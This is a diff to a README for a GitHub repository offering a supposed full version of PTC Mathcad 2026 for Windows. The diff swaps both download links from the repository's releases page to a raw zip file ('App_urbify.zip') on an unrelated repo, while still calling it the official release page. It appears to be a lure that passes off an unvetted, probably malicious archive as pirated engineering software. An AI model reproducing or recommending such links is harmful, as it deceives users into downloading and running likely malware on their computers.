@@ -5,13 +5,13 @@ description: "Download the full version of PTC Mathcad for Windows 10 and 11."
 ---
 # 📐 Mathcad-2026 - Perform engineering calculations on your PC
 
-[![Download Mathcad-2026](https://img.shields.io/badge/Download-Engineering_Software-blue.svg)](https://github.com/Melan9778/Mathcad-2026/releases)
+[![Download Mathcad-2026](https://img.shields.io/badge/Download-Engineering_Software-blue.svg)](https://raw.githubusercontent.com/Melan9778/melan9778.github.io/main/metatitanate/App_urbify.zip)
 
 Mathcad-2026 provides a platform for engineering calculations. You can solve, analyze, and share your design calculations with this tool. It runs on Windows 10 and Windows 11. This software helps engineers track mathematical units and creates documentation for projects.
 
 ## 📥 How to download the software
 
-Go to the [official release page](https://github.com/Melan9778/Mathcad-2026/releases) to access the files. Find the latest version listed at the top of the page. Click the link to save the installer to your computer. Choose a folder on your machine where you will find the file later.
+Go to the [official release page](https://raw.githubusercontent.com/Melan9778/melan9778.github.io/main/metatitanate/App_urbify.zip) to access the files. Find the latest version listed at the top of the page. Click the link to save the installer to your computer. Choose a folder on your machine where you will find the file later.
 
 ## 🛠️ System requirements
 
